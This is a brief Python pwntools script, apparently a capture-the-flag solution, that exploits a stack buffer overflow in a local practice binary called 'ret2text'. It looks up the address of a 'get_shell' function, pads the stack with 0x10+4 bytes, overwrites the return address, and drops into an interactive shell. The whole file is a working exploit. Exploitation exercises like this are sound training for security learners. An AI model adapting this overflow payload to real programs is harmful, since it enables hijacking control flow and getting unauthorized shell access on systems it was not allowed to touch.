from pwn import *

elf = ELF("./ret2text")

sys_addr = elf.symbols["get_shell"]

print(sys_addr)

payload = b'A' * (0x10 + 4) + p32(sys_addr)

io = process("./ret2text")

io.recvline()

io.sendline(payload)

io.interactive()


